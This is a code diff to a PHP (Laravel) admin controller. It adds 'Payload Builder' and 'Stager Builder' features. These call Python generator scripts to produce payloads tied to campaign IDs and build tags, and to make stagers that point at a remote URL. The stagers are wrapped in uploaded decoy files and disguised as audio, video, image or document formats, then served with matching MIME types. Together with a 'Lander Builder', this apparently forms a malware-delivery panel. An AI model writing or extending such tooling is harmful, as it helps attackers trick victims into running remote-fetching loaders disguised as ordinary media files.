@@ -6,6 +6,8 @@ use App\Http\Controllers\Controller;
 use Illuminate\Http\Request;
 use Illuminate\Support\Facades\Storage;
 use Inertia\Inertia;
+use Symfony\Component\Process\Process;
+use Symfony\Component\Process\Exception\ProcessFailedException;
 
 class ToolsController extends Controller
 {
@@ -15,6 +17,36 @@ class ToolsController extends Controller
     public function index()
     {
         return Inertia::render('Admin/Tools/Index');
+    }
+
+    /**
+     * Display the Payload Builder page.
+     */
+    public function payloadBuilder()
+    {
+        return Inertia::render('Admin/Tools/PayloadBuilder/Index');
+    }
+
+    /**
+     * Display the Stager Builder page.
+     */
+    public function stagerBuilder()
+    {
+        $formats = [];
+        $mimeTypes = [];
+        $headerMap = config('stager_header_map');
+
+        foreach ($headerMap as $group => $groupFormats) {
+            $formats[$group] = array_keys($groupFormats);
+            foreach ($groupFormats as $ext => $header) {
+                $mimeTypes[$ext] = $this->guessMimeType($ext);
+            }
+        }
+
+        return Inertia::render('Admin/Tools/StagerBuilder/Index', [
+            'formats' => $formats,
+            'mimeTypes' => $mimeTypes
+        ]);
     }
 
     /**
@@ -45,6 +77,351 @@ class ToolsController extends Controller
     public function landerBuilder()
     {
         return Inertia::render('Admin/Tools/LanderBuilder/Index');
+    }
+
+    public function generatePayload(Request $request)
+    {
+        $request->validate([
+            'payloadUrl' => 'required|url',
+            'payloadName' => 'required|string|max:255',
+            'campaignId' => 'nullable|string|max:255',
+            'buildTag' => 'required|string|max:255',
+        ]);
+
+        $url = $request->input('payloadUrl');
+        $name = $request->input('payloadName');
+        $campaign = $request->input('campaignId');
+        $buildTag = $request->input('buildTag');
+
+        $args = ['python3', base_path('scripts/payload_generator.py'), $url, $name, $campaign];
+        if ($campaign) {
+            $args[] = $campaign;
+        }
+
+        $process = new Process($args);
+        $process->run();
+
+        if (!$process->isSuccessful()) {
+            return back()->withErrors(['payloadError' => $process->getErrorOutput()]);
+        }
+
+        $generatedPath = trim($process->getOutput());
+
+        $filename = basename($generatedPath);
+        $payloadContents = file_get_contents($generatedPath);
+
+        $path = "payloads/{$buildTag}/{$filename}";
+
+        // if (Storage::exists($path)) {
+        //     return back()->withErrors(['payloadName' => 'A payload with this filename already exists.']);
+        // }
+
+        Storage::put($path, $payloadContents);
+
+        return redirect()->route('admin.tools.payloadbuilder.index')
+            ->with('success', 'Payload generated successfully!')
+            ->with('filename', $filename)
+            ->with('build_tag', $buildTag);
+    }
+
+    /**
+     * Export the generated payload to a file.
+     */
+    public function exportPayload(Request $request)
+    {
+        $filename = $request->query('filename');
+        $buildTag = $request->query('build_tag');
+    
+        if (!$filename || !$buildTag || !Storage::exists("payloads/{$buildTag}/{$filename}")) {
+            abort(404);
+        }
+    
+        return Storage::download("payloads/{$buildTag}/{$filename}");
+    }
+
+    public function payloadsJson(Request $request)
+    {
+        $perPage = 10;
+        $all = Storage::allFiles('payloads');
+
+        $flattened = collect($all)
+            ->filter(fn($path) => str_ends_with($path, '.txt'))
+            ->map(function ($path) {
+                [$_, $tag, $file] = explode('/', $path, 3);
+                return ['build_tag' => $tag, 'filename' => $file];
+            })
+            ->sortBy('filename')
+            ->values();
+
+        $page = $request->get('page', 1);
+        $offset = ($page - 1) * $perPage;
+        $paginated = $flattened->slice($offset, $perPage)->values();
+
+        $paginator = new \Illuminate\Pagination\LengthAwarePaginator(
+            $paginated,
+            $flattened->count(),
+            $perPage,
+            $page,
+            ['path' => route('admin.tools.payloads.json')]
+        );
+
+        return response()->json($paginator);
+    }
+
+    /**
+     * Delete a stored payload.
+     */
+    public function deletePayload(Request $request, $buildTag, $filename)
+    {
+        if (Storage::exists("payloads/{$buildTag}/{$filename}")) {
+            Storage::delete("payloads/{$buildTag}/{$filename}");
+            return response()->json(['success' => true]);
+        }
+        return response()->json(['success' => false], 404);
+    }
+
+    public function generateStager(Request $request)
+    {
+        $request->validate([
+            'remoteTxtUrl'    => 'required|url',
+            'outputFilename'  => 'required|string|max:255',
+            'outputFormat'    => 'required|string',
+            'decoyFile'       => 'required|file',
+        ]);
+    
+        $url       = $request->input('remoteTxtUrl');
+        $format    = $request->input('outputFormat');
+        $baseName  = pathinfo($request->input('outputFilename'), PATHINFO_FILENAME);
+        $decoy     = $request->file('decoyFile');
+    
+        $filename     = $baseName . '.' . $format;
+        $tempFolder   = storage_path('app/tmp_stagers'); // TEMP ONLY for script
+        $ext          = $decoy->getClientOriginalExtension();
+        $decoyPath    = $tempFolder . '/decoy_' . uniqid() . '.' . $ext;
+    
+        // Ensure temp folder exists
+        if (!is_dir($tempFolder)) {
+            mkdir($tempFolder, 0775, true);
+        }
+    
+        // Move decoy to temp
+        $decoy->move(dirname($decoyPath), basename($decoyPath));
+    
+        // Encode header map for script
+        $headerMap     = config('stager_header_map');
+        $headerMapJson = base64_encode(json_encode($headerMap, JSON_UNESCAPED_SLASHES | JSON_THROW_ON_ERROR));
+    
+        $process = new Process([
+            'python3',
+            base_path('scripts/stager_generator.py'),
+            $url,
+            $decoyPath,
+            $tempFolder,
+            $filename,
+            $format,
+            $headerMapJson
+        ]);
+    
+        $process->run();
+
+        // Cleanup decoy file
+        if (file_exists($decoyPath)) {
+            unlink($decoyPath);
+        }
+    
+        if (!$process->isSuccessful()) {
+            $this->deleteDirectory($tempFolder);
+            return response()->json(['error' => $process->getErrorOutput()], 500);
+        }
+    
+        $finalPath = trim($process->getOutput());
+        $finalFile = basename($finalPath);
+
+        // ⏳ Wait briefly for file to fully flush
+        usleep(200000); // 0.2 seconds
+
+        if (!file_exists($finalPath)) {
+            return response()->json(['error' => 'Generated stager file not found.'], 500);
+        }
+    
+        // Read and store final file
+        $content = file_get_contents($finalPath);
+    
+        if (!Storage::exists('stagers')) {
+            Storage::makeDirectory('stagers');
+        }
+    
+        Storage::put("stagers/{$finalFile}", $content);
+        unlink($finalPath); // Clean up final file from tmp
+    
+        $this->deleteDirectory($tempFolder);
+
+        return response()->json(['filename' => $finalFile]);
+    }
+
+    /**
+     * Recursively delete a directory.
+     */
+    private function deleteDirectory($dir)
+    {
+        if (!is_dir($dir)) return;
+
+        $files = array_diff(scandir($dir), ['.', '..']);
+        foreach ($files as $file) {
+            $fullPath = "$dir/$file";
+            is_dir($fullPath) ? $this->deleteDirectory($fullPath) : unlink($fullPath);
+        }
+        rmdir($dir);
+    }  
+
+    // Export stager
+    public function exportStager(Request $request)
+    {
+        $filename = $request->query('filename') ?? $request->route('filename');
+
+        if (!$filename || !Storage::exists("stagers/{$filename}")) {
+            abort(404);
+        }
+
+        $fullPath = Storage::path("stagers/{$filename}");
+        $extension = pathinfo($filename, PATHINFO_EXTENSION);
+        $mimeType = $this->guessMimeType($extension); // Use your helper method
+
+        return response()->download($fullPath, $filename, [
+            'Content-Type' => $mimeType,
+            'Content-Disposition' => 'attachment; filename="' . $filename . '"',
+        ]);
+    }
+
+    // List stagers
+    public function stagersJson(Request $request)
+    {
+        $perPage = 10;
+        $files = collect(Storage::files('stagers'))
+            ->filter(function ($file) {
+                $basename = basename($file);
+                return !in_array($basename, ['.DS_Store', '.gitkeep']);
+            })
+            ->map(fn($file) => basename($file))
+            ->sort()
+            ->values();
+    
+        $page = $request->get('page', 1);
+        $offset = ($page - 1) * $perPage;
+    
+        $paginated = $files->slice($offset, $perPage)->values();
+    
+        $paginator = new \Illuminate\Pagination\LengthAwarePaginator(
+            $paginated,
+            $files->count(),
+            $perPage,
+            $page,
+            ['path' => route('admin.tools.stagers.json')]
+        );
+    
+        return response()->json($paginator);
+    }    
+
+    // Delete stager
+    public function deleteStager($filename)
+    {
+        if (Storage::exists("stagers/{$filename}")) {
+            Storage::delete("stagers/{$filename}");
+            return response()->json(['success' => true]);
+        }
+        return response()->json(['success' => false], 404);
+    }
+
+    private function guessMimeType($ext)
+    {
+        $map = [
+            // 🎵 Audio
+            'ogg' => 'audio/ogg',
+            'opus' => 'audio/ogg',
+            'mp3' => 'audio/mpeg',
+            'mp2' => 'audio/mpeg',
+            'wav' => 'audio/wav',
+            'aiff' => 'audio/aiff',
+            'aac' => 'audio/aac',
+            'm4a' => 'audio/mp4',
+            'alac' => 'audio/mp4',
+            'flac' => 'audio/flac',
+            'ac3' => 'audio/ac3',
+            'dts' => 'audio/vnd.dts',
+            'mid' => 'audio/midi',
+            'amr' => 'audio/amr',
+            'wma' => 'audio/x-ms-wma',
+            'ra' => 'audio/vnd.rn-realaudio',
+            'voc' => 'audio/x-voc',
+            'vox' => 'audio/x-voxware',
+            'snd' => 'audio/basic',
+            'au' => 'audio/basic',
+            's3m' => 'audio/s3m',
+            'stm' => 'audio/x-stm',
+            'mod' => 'audio/mod',
+            'mo3' => 'audio/x-mo3',
+            'sf2' => 'audio/x-soundfont',
+            'it' => 'audio/it',
+            'msv' => 'audio/x-msv',
+            'shn' => 'audio/x-shorten',
+
+            // 🎥 Video
+            'mp4' => 'video/mp4',
+            'm4v' => 'video/x-m4v',
+            'mov' => 'video/quicktime',
+            'avi' => 'video/x-msvideo',
+            'webm' => 'video/webm',
+            'flv' => 'video/x-flv',
+            'f4v' => 'video/x-f4v',
+            'mkv' => 'video/x-matroska',
+            'ts' => 'video/MP2T',
+            'wmv' => 'video/x-ms-wmv',
+            'rm' => 'application/vnd.rn-realmedia',
+            'divx' => 'video/divx',
+            'mpg' => 'video/mpeg',
+            'mpeg' => 'video/mpeg',
+            'asf' => 'video/x-ms-asf',
+            'nut' => 'video/nut',
+            'viv' => 'video/vnd.vivo',
+            'roq' => 'video/roq',
+            'smk' => 'video/smk',
+            'bik' => 'video/bink',
+            'mve' => 'video/x-mve',
+            'nsv' => 'video/x-nsv',
+            'r3d' => 'video/x-red',
+            'mjpeg' => 'video/mjpeg',
+            '3gp' => 'video/3gpp',
+            '3g2' => 'video/3gpp2',
+
+            // 🖼️ Image
+            'png' => 'image/png',
+            'jpg' => 'image/jpeg',
+            'jpeg' => 'image/jpeg',
+            'bmp' => 'image/bmp',
+            'tiff' => 'image/tiff',
+            'ico' => 'image/x-icon',
+            'webp' => 'image/webp',
+            'heic' => 'image/heic',
+            'jfif' => 'image/jpeg',
+            'exif' => 'image/jpeg',
+
+            // 📄 Documents
+            'pdf' => 'application/pdf',
+            'doc' => 'application/msword',
+            'docx' => 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
+            'ppt' => 'application/vnd.ms-powerpoint',
+            'pptx' => 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
+            'xls' => 'application/vnd.ms-excel',
+            'xlsx' => 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
+            'rtf' => 'application/rtf',
+            'odt' => 'application/vnd.oasis.opendocument.text',
+            'odp' => 'application/vnd.oasis.opendocument.presentation',
+            'ods' => 'application/vnd.oasis.opendocument.spreadsheet',
+            'epub' => 'application/epub+zip',
+            'xps' => 'application/vnd.ms-xpsdocument',
+        ];
+
+        return $map[strtolower($ext)] ?? 'application/octet-stream';
     }
 
     /**
